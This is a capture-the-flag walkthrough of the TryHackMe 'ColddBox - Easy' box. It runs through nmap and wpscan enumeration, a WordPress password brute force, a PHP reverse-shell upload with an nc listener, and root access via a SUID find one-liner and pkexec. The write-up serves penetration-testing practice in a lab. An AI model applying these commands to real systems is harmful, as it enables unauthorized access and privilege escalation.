---
{"dg-publish":true,"permalink":"/write-ups/try-hack-me/coldd-box-easy/","tags":["CTF","write-up","Sensitive_data_exposure","Object_Injection"]}
---


---

![Pasted image 20241126163439.png|300](/img/user/attachments/Pasted%20image%2020241126163439.png)

> [!INFO] Info about ColddBox - Easy
>  An easy level machine with multiple ways to escalate privileges. By Hixec.

> [!FAQ]- Hints
> Provide the flag in its encoded format.

---
# Active reconnaissance
## Host discovery
## Port scan
Executing a fast general scan to all ports.
```shell
sudo nmap TARGET_IP -n -p- -sS -Pn -vvv --open --min-rate 5000 -oN nmap_scan
```

```c
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 61
```

---
# Enumeration
Executing a deep scan with common scripts only to ports that we are interested.
```shell
sudo nmap TARGET_IP -sCV -p 80 -oN nmap_enum
```
## OS
Ubuntu
## Port 80 - Apache
80/tcp open  http  **Apache** httpd **2.4.18** ((Ubuntu))
http-server-header: Apache/2.4.18 (Ubuntu)
http-title: **ColddBox** | One more machine
http-generator: **WordPress 4.1.31**

![Pasted image 20241126181735.png|600](/img/user/attachments/Pasted%20image%2020241126181735.png)
From here we got I couple of possible usernames: *Coldd* and *Sr Mott*

---
# Vulnerability analysis
## Wordpress 4.1.31
Searching vulnerabilities for this version, the most interesting is this but we need acces to the admin panel
![Pasted image 20241126210704.png](/img/user/attachments/Pasted%20image%2020241126210704.png)
Or use wpsscan to detect it
```shell
wpscan --url http://colddbox.thm/ -e vp --api-token="tyfkmo................756ubuyb"
```
We got
![Pasted image 20241127071959.png](/img/user/attachments/Pasted%20image%2020241127071959.png)

---
# Exploitation
## Fuzzing
Executing fuzzing
```shell
wfuzz -c -t 50 --hc=404 --hl=643 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://colddbox.thm/FUZZ
```

I found interesting directories excluding the default.
![Pasted image 20241126175148.png](/img/user/attachments/Pasted%20image%2020241126175148.png)
### Hidden
![Pasted image 20241126181633.png](/img/user/attachments/Pasted%20image%2020241126181633.png)
We got some possible usernames: *Hugo*, *Philip* and *C0ldd* (note the number zero instead of the letter O)
If we validate them in the default login, all of them exist.
## Brute Force to the login page
Use Wpscan to find a password of the most probable admin user based on the info of hidden page. **C0ldd**
```shell
wpscan --url http://colddbox.thm/ --passwords /usr/share/wordlists/rockyou.txt --usernames C0ldd
```
![Pasted image 20241126203642.png](/img/user/attachments/Pasted%20image%2020241126203642.png)
## Wordpress panel
Login to the admin panel
![Pasted image 20241126203835.png|600](/img/user/attachments/Pasted%20image%2020241126203835.png)
## Admin + PHP File Upload
Now we have access to the admin panel, and we can try the vulnerability from above.
1. Go to Plugins
2. Add new
   ![Pasted image 20241127072633.png|500](/img/user/attachments/Pasted%20image%2020241127072633.png)
3. Upload Plugin
   ![Pasted image 20241127072703.png|500](/img/user/attachments/Pasted%20image%2020241127072703.png)
4. Browser
   ![Pasted image 20241127072748.png|500](/img/user/attachments/Pasted%20image%2020241127072748.png)
5. Select the reverse hell `php` file (`rev_shell_1.php`) (https://www.revshells.com/ `php` Ivan)
   ![Pasted image 20241127072905.png|500](/img/user/attachments/Pasted%20image%2020241127072905.png)
6. Press  `install now`
   ![Pasted image 20241127072924.png|500](/img/user/attachments/Pasted%20image%2020241127072924.png)
   ![Pasted image 20241127073036.png|500](/img/user/attachments/Pasted%20image%2020241127073036.png)
   The installation **fails** but the file has been uploaded
7. Set the listener on the attacker machine, e.g. `rlwrap nc -lnvp 4747`
   ![Pasted image 20241127072956.png](/img/user/attachments/Pasted%20image%2020241127072956.png)
8. Go to the file directory, in this case `http://colddbox.thm/wp-content/uploads/2024/11/rev_shell_1.php` (Change the year and month) and we have a revere shell on the listener with the account which is running the WordPress, in this case `www-data`
   ![Pasted image 20241127073305.png|500](/img/user/attachments/Pasted%20image%2020241127073305.png)

---
# Privilege escalation
## Method 1
Exploting pkexec [[CVE-2021-4034\|CVE-2021-4034]]
##  Method 2
Checking SUID
```shell
find / -type f -perm -u=s -ls 2>/dev/null
```
We have  two posibble ways to escalate.
![Pasted image 20241127074340.png](/img/user/attachments/Pasted%20image%2020241127074340.png)
Lets check `find` with gtfobins
![Pasted image 20241127074547.png](/img/user/attachments/Pasted%20image%2020241127074547.png)
```shell
/usr/bin/find . -exec /bin/sh -p \; -quit
```
![Pasted image 20241127075454.png](/img/user/attachments/Pasted%20image%2020241127075454.png)
Now we are root

Get the user flag
> [!check] User flag
> ![Pasted image 20241127090504.png](/img/user/attachments/Pasted%20image%2020241127090504.png)

Get the root flag
> [!check] Root flag
> ![Pasted image 20241127090558.png](/img/user/attachments/Pasted%20image%2020241127090558.png)